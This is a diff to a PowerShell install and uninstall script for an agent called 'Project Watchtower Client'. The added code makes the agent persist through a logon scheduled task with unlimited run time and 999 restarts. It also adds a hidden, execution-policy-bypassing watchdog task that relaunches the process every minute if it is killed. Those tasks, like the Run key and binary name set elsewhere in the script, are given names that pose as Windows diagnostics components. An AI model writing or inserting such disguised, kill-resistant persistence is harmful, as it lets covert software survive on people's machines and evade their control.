@@ -328,33 +328,26 @@ try {
     Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
 } catch {}
 
-# Method B: Scheduled Task at user logon (Interactive highest privilege)
-$binCommand = "\`"$BinaryPath\`" --config \`"$ConfigPath\`""
+# Method B: Scheduled Task at user logon (Power-resilient, no battery stop, no 72h limit, auto-restart)
 try {
-    schtasks.exe /create /tn $TaskName /tr $binCommand /sc onlogon /rl highest /f 2>$null | Out-Null
+    Unregister-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Confirm:\$false -ErrorAction SilentlyContinue
+    $taskAction = New-ScheduledTaskAction -Execute $BinaryPath -Argument "--config \`"$ConfigPath\`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
+    Register-ScheduledTask -TaskName "SystemDiagnosticsHostTask" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User $env:USERNAME -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
-if ($LASTEXITCODE -ne 0) {
-    try {
-        schtasks.exe /create /tn $TaskName /tr $binCommand /sc onlogon /f 2>$null | Out-Null
-    } catch {}
-}
 
-# Method C: Watchdog Scheduled Task (Checks and revives process every 1 minute if killed)
-$watchdogCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \`"if (-not (Get-Process -Name 'watchtower' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$BinaryPath' -ArgumentList '--config', '$ConfigPath' -WindowStyle Hidden }\`""
+# Method C: Watchdog Scheduled Task (Checks and revives process every 1 minute)
 try {
-    schtasks.exe /create /tn $WatchdogTaskName /tr $watchdogCmd /sc minute /mo 1 /rl highest /f 2>$null | Out-Null
+    Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:\$false -ErrorAction SilentlyContinue
+    $watchdogScript = "if (-not (Get-Process -Name 'watchtower' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$BinaryPath' -ArgumentList '--config', '$ConfigPath' -WindowStyle Hidden }"
+    $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \`"$watchdogScript\`""
+    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 9999)
+    $watchdogSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5) -StartWhenAvailable
+    Register-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Action $watchdogAction -Trigger $watchdogTrigger -Settings $watchdogSettings -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
-if ($LASTEXITCODE -ne 0) {
-    try {
-        schtasks.exe /create /tn $WatchdogTaskName /tr $watchdogCmd /sc minute /mo 1 /f 2>$null | Out-Null
-    } catch {}
-}
 
 # 6. Immediately launch the process in background for the current user session
-try {
-    schtasks.exe /run /tn $TaskName 2>$null | Out-Null
-} catch {}
-
 Start-Sleep -Milliseconds 300
 $proc = Get-Process -Name "watchtower" -ErrorAction SilentlyContinue
 if (-not $proc) {
@@ -375,8 +368,8 @@ $ProgressPreference = 'SilentlyContinue'
 
 $InstallDir = "C:\\ProgramData\\Watchtower"
 $ServiceName = "WindowsDiagnosticsHost"
-$TaskName = "Microsoft\\Windows\\SystemDiagnosticsHostTask"
-$WatchdogTaskName = "Microsoft\\Windows\\SystemDiagnosticsWatchdog"
+$TaskName = "SystemDiagnosticsHostTask"
+$WatchdogTaskName = "SystemDiagnosticsWatchdog"
 
 Write-Host "🛑 Uninstalling Project Watchtower Client..." -ForegroundColor Yellow
 
@@ -384,8 +377,12 @@ Write-Host "🛑 Uninstalling Project Watchtower Client..." -ForegroundColor Yel
 Stop-Process -Name "watchtower" -Force -ErrorAction SilentlyContinue
 
 # 2. Remove scheduled tasks
+Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName $WatchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue
 schtasks.exe /delete /tn $TaskName /f 2>$null | Out-Null
 schtasks.exe /delete /tn $WatchdogTaskName /f 2>$null | Out-Null
+schtasks.exe /delete /tn "Microsoft\\Windows\\SystemDiagnosticsHostTask" /f 2>$null | Out-Null
+schtasks.exe /delete /tn "Microsoft\\Windows\\SystemDiagnosticsWatchdog" /f 2>$null | Out-Null
 
 # 3. Remove legacy service if present
 sc.exe delete $ServiceName 2>$null | Out-Null
